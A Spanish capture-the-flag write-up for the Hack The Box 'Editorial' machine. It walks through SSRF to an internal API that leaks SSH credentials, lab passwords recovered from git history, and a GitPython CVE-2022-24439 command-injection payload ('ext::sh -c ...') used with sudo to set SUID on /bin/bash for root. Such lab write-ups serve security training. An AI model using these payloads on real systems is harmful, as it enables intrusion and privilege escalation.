---
layout: post
title: Editorial - Hack The Box
date: 2025-10-21
categories: [htb, linux]
tags:  [Linux, Web, SSRF, Sudoers, API, Github, Gitpython, CVE]
image:
  path: htb-writeup-editorial/editorial.png
  alt: editorial
---

![logo](htb-writeup-editorial/editorial-logo.png){: .right w="200" h="200" }

`Editorial` es una máquina Linux de dificultad fácil que cuenta con una aplicación web de publicación vulnerable a `Falsificación de Solicitud del Lado del Servidor` (SSRF). Esta vulnerabilidad se aprovecha para acceder a una API interna en ejecución, que a su vez se utiliza para obtener credenciales que permiten el acceso `SSH` a la máquina. Al enumerar el sistema, se revela un repositorio Git que se utiliza para revelar las credenciales de un nuevo usuario. El usuario `root` se puede obtener explotando la `CVE-2022-24439` y la configuración de sudo.

## Reconocimiento

### Nmap

Empezamos con un escaneo de puertos inicial sobre la maquina victima

```bash
nmap -p- --open -T4 -n -Pn <IP>
```

```bash
PORTS
-> 22 SSH
-> 80 HTTP
```

### Nmap Servicios de Puertos

podemos ver con mas detalles a que servicio corresponde y las versiones del ssh y pagina web pasando el -sCV, puede ser que hasta nos diga el dominio de la web

```bash
nmap -p22,80 -sCV 10.10.11.20

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

nos aparece el dominio real de la maquina victima, vamos a incorporarlo en nuestro `/etc/hosts`, esto lo hacemos para que cuando vayamos al navegador web y pongamos `http://editorial.htb/` nos resuelva bien el host y veamos bien la web.

```bash
echo "10.10.11.20 editorial.htb" >> /etc/hosts
```

## Web

![](htb-writeup-editorial/editorial1.png)

### Enumeracion Web Fuzz

Ya estamos en la web, lo primero que vamos a realizar es un fuzzeo intenso de la pagina, en busca de endpoints o funcionalidades de la app, a simple vista parece una biblioteca

```bash
wfuzz -c --hc=404 --hh=8562 -t 100 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://editorial.htb/FUZZ"
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************
Target: http://editorial.htb/FUZZ
Total requests: 220559

ID           Response   Lines    Word       Chars       Payload 

000000026:   200        71 L     232 W      2938 Ch     "about" 
000000366:   200        209 L    537 W      7134 Ch     "upload"
```

Wfuzz es una de las herramientas mas sofisticadas para estas tareas, `--hc=404` le indicamos que no queremos ver paginas que resuelvan un error 404 y con `--hh`= le indicamos que no queremos ver paginas que tengan esta cantida de caracteres

![](htb-writeup-editorial/editorial2.png)

Esta es la web de upload, podemos publicar o subir un libro en formato archivo o tambien en formato url, vamos a realizar una prueba.... en el campo url voy a poner mi ip de esta manera

![](htb-writeup-editorial/editorial3.png)

esperamos que nos llegue alguna peticion, si nos llega podemos hablar de una vulnerabilidad conocida como `Falsificación de Solicitud del Lado del Servidor (Server Side Request Forgery)`

### SSRF

Las fallas de SSRF ocurren cuando una aplicación web está obteniendo un recurso remoto sin validar la URL proporcionada por el usuario. Permite que un atacante coaccione a la aplicación para que envíe una solicitud falsificada a un destino inesperado, incluso cuando está protegido por un firewall, VPN u otro tipo de lista de control de acceso a la red (ACL).

Dado que las aplicaciones web modernas brindan a los usuarios finales funciones convenientes, la búsqueda de una URL se convierte en un escenario común. Como resultado, la incidencia de SSRF está aumentando. Además, la gravedad de SSRF es cada vez mayor debido a los servicios en la nube y la complejidad de las arquitecturas.

![](htb-writeup-editorial/editorial4.png)

### Explotacion SSRF

Entonces en lugar de poner otra vez nuestra ip podemos intentar llegar a ver el localhost y puertos abiertos que tenga la maquina victima, si existen restricciones? siempre hay [formas de intentar bypassearlas](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md#bypassing-filters).

En esta parte vamos a abrir Burpsuite, esta herramienta es muy buena para hacking web y estas vulnerabilidades, nos permite camibar metodos, peticiones, ver como se tramitan, etc.

![](htb-writeup-editorial/editorial5.png)

Si volvemos a repetir la vulnerabilidad nos manda a una imagen que crea por detras, si la visitamos tenemos esto... parece una imagen por defecto que crea la maquina.

![](htb-writeup-editorial/editorial6.png)

El plan sera copiar toda nuestra peticion de burpsuite, guardarlo como peticion.req y fuzzear por los puertos internos de la maquina, es decir en ves de pasarle nuestra ip vamos a pasarle 127.0.0.1:FUZZ, la herramienta fuff va a fuzzear en esa parte que le indiques con la palabra FUZZ

![](htb-writeup-editorial/editorial7.png)

Hacemos un `nano peticion.req` y copiamos toda la peticion, no olviden cambiar la parte donde va la url 127.0.0.1:FUZZ, CTRL + O y guardar, CTRL + X para salir de nano

![](htb-writeup-editorial/editorial8.png)

lo que nos queda es conseguir una wordlists o diccionario de los puertos, recordemos que tenemos 65535 puertos en total... con el poder de bash vamos a fabricarnos un diccionario que contenga todos los puertos

```bash
seq 1 65535 | tail -n 5
65531
65532
65533
65534
65535
```


```bash
seq 1 65535 > ports.txt
```

esto nos da un dicionario de todos los puertos que necesitamos pasarle a la herramienta wfuzz

```bash
ffuf -c -w ports.txt -request peticion.req -request-proto http -fs 61
```

![](htb-writeup-editorial/editorial9.png)

encontramos un puerto abierto internamente en la maquina victima, puerto 5000.. vamos a comprobarlo en burpsuite para ver que nos devuelve esta vez.

![](htb-writeup-editorial/editorial10.png)

parece que pasa un tiempo determinado y vuelve a refrescar la url que nos dieron, hay q ser rapidos y listar todo

![](htb-writeup-editorial/editorial11.png)

listo, podemos ver informacion relevante en esta parte.... vemos endpoints con mucha informacion, quiero observar esto desde mi terminal para apreciar la informacion de una mejor manera.

```bash
curl -s -X GET "http://editorial.htb/static/uploads/d378012d-9008-4f49-a460-a8b4c106e7f9"
<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

si te sale este error volve a enviar la peticion desde burp... como dije antes la url se refresca o reinicia.. deben haber tareas crontab por detras que hacen que la maquina se reinicie... en fin esto es HTB...

tenemos que ser rapidos.. yyyy pudimos llegar y ver las apis o enpoints

```bash
curl -s -X GET "http://editorial.htb/static/uploads/26c234bf-53fe-4689-84be-c245ba0bbf18" | jq
{
  "messages": [
    {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "coupons": {
        "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
      "platform_use": {
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
    {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}
```

En burpsuite vamos a poner el endpoint que queremos ver, en mi caso quiero enumerar por usuarios o informacion de los administradores de la web, asi que lo que mas se acerca a tener esta info es este enpoint `/api/latest/metadata/messages/authors`

```bash
POST /upload-cover HTTP/1.1
Host: editorial.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------65112106330445755751282750520
Content-Length: 398
Origin: http://editorial.htb
Connection: keep-alive
Referer: http://editorial.htb/upload

-----------------------------65112106330445755751282750520
Content-Disposition: form-data; name="bookurl"

http://127.0.0.1:5000/api/latest/metadata/messages/authors
-----------------------------65112106330445755751282750520

Content-Disposition: form-data; name="bookfile"; filename=""

Content-Type: application/octet-stream
-----------------------------65112106330445755751282750520--
```

![](htb-writeup-editorial/editorial12.png)

Podemos lograr visualizar un usuario y contraseña, el impacto de esta vulnerabilidad es critico. Se puede llegar a filtrar, datos sensibles o apis internas que estan en desarrollo aun... 

```bash
ssh dev@10.10.11.20
Password: 
```

## Escalada de Privilegios

### Shell Dev

![](htb-writeup-editorial/editorial13.png)

Vamos a entrar a la carpeta apps, que es donde esta todo el proyecto de la aplicacion web, cuando entramos nos encontramos con un .git... si hacemos un git log vamos a ver todos los cambios que se realizo en le proyecto, a mi me llama la atencion uno de ellos

```bash
dev@editorial:~/apps$ ls -la
total 12
drwxrwxr-x 3 dev dev 4096 Jun  5 14:36 .
drwxr-x--- 4 dev dev 4096 Oct 29 18:40 ..
drwxr-xr-x 8 dev dev 4096 Jun  5 14:36 .git
dev@editorial:~/apps$ git log
commit 8ad0f3187e2bda88bba85074635ea942974587e8 (HEAD -> master)
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:04:21 2023 -0500

    fix: bugfix in api port endpoint

commit dfef9f20e57d730b7d71967582035925d57ad883
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:01:11 2023 -0500

    change: remove debug and update api port

commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.

commit 1e84a036b2f33c59e2390730699a488c65643d28
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:51:10 2023 -0500

    feat: create api to editorial info
    
    * It (will) contains internal info about the editorial, this enable
       faster access to information.

commit 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:48:43 2023 -0500

    feat: create editorial app
```

`change(api): downgrading prod to dev` esto parece raro, ya que nosotros encontramos las credenciales del usuario dev en una api, puede que anteriormente haya existido otro usuario y contraseña expuesta

Asi que con git show vamos a ver en profundidad todo lo que se cambio, solo hay que pasarle este commit `b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae`

```bash
dev@editorial:~/apps$ git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.

diff --git a/app_api/app.py b/app_api/app.py
index 61b786f..3373b14 100644
--- a/app_api/app.py
+++ b/app_api/app.py
@@ -64,7 +64,7 @@ def index():
 @app.route(api_route + '/authors/message', methods=['GET'])
 def api_mail_new_authors():
     return jsonify({
-        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
+        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
     }) # TODO: replace dev credentials when checks pass
 
 # -------------------------------
```
Estas credenciales se cambiaron por las de el usuario DEV

```bash
prod Password: 080217_Producti0n_2023!@
```

### Shell Prod

Conseguimos convertirnos en el usuario prod


Vamos a enumerar si contamos con permisos SUDO para ejecutar algun binario o script del sistema

```bash
prod@editorial:/home/dev/apps$ sudo -l
[sudo] password for prod: 
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

### SUDO

Podemos ejecutar como el usuario root este script de python

```bash
prod@editorial:/home/dev/apps$ ls -l /opt/internal_apps/clone_changes/clone_prod_change.py
-rwxr-x--- 1 root prod 256 Jun  4 11:30 /opt/internal_apps/clone_changes/clone_prod_change.py
```

Tenemos permisos de lectura pero no de escritura

```bash
prod@editorial:/home/dev/apps$ cat /opt/internal_apps/clone_changes/clone_prod_change.py
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])

```

El script no es muy complejo, al parecer se ubica en `/opt/internal_apps/clone_changes` ahí es donde hace toda su ejecución. Toma un parámetro y lo guarda en una variable llamada `url_to_clone`, lo siguiente que hace es iniciar un repositorio y clonar los cambios alojados en la URL que le pasamos, sobre la carpeta `new_changes`.

Tambien notamos que hace un `from git import Repo` me parece que es una vulnerabilidad que salio por alla en el 2022, vamos a investigar para salir de dudas muchachos [esta informacion te puede servir](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858).

```bash
prod@editorial:/home/dev/apps$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py $(whoami)
Traceback (most recent call last):
  File "/opt/internal_apps/clone_changes/clone_prod_change.py", line 12, in <module>
    r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1275, in clone_from
    return cls._clone(git, url, to_path, GitCmdObjectDB, progress, multi_options, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1194, in _clone
    finalize_process(proc, stderr=stderr)
  File "/usr/local/lib/python3.10/dist-packages/git/util.py", line 419, in finalize_process
    proc.wait(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/cmd.py", line 559, in wait
    raise GitCommandError(remove_password_if_present(self.args), status, errstr)
git.exc.GitCommandError: Cmd('git') failed due to: exit code(128)
  cmdline: git clone -v -c protocol.ext.allow=always prod new_changes
  stderr: 'fatal: repository 'prod' does not exist
'
prod@editorial:/home/dev/apps$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py ';whoami'
Traceback (most recent call last):
  File "/opt/internal_apps/clone_changes/clone_prod_change.py", line 12, in <module>
    r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1275, in clone_from
    return cls._clone(git, url, to_path, GitCmdObjectDB, progress, multi_options, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1194, in _clone
    finalize_process(proc, stderr=stderr)
  File "/usr/local/lib/python3.10/dist-packages/git/util.py", line 419, in finalize_process
    proc.wait(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/cmd.py", line 559, in wait
    raise GitCommandError(remove_password_if_present(self.args), status, errstr)
git.exc.GitCommandError: Cmd('git') failed due to: exit code(128)
  cmdline: git clone -v -c protocol.ext.allow=always ;whoami new_changes
  stderr: 'fatal: repository ';whoami' does not exist
```

Primero realizamos unas pruebas con inyecciones tipicas de Command Injection sin resultados, probamos el PoC que nos dice la vulnerabilidade de gitpython.

```bash
prod@editorial:/home/dev/apps$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c touch% /tmp/pwned'
```

Esto va a crear un archivo llamado pwned en la carpeta /tmp.

![](htb-writeup-editorial/editorial14.png)

Lo hizo perfectamente como indica el PoC (Proof of Concept), creo un archivo vacio pero lo mas importante a rescatar de este archivo es que el propiertario es root, asi que estariamos ejecutando comandos como root y no como el usuario prod, vamos a cambiar el comando touch por un `chmod u+s /bin/bash.`

![](htb-writeup-editorial/editorial15.png)

Que es un permiso SUID y lo peligroso que es tener la /bin/bash con este permiso?

Cuando en un binario o fichero el bit SUID está activado significa que la persona que lo ejecute va a tener los mismos permisos que la persona que lo creó. Es decir, si lo creó root tendremos permisos `root`. `Lo peligroso es que con un simple bash -p` podemos obtener una consola con los privilegios maximos.

![](htb-writeup-editorial/editorial16.png)



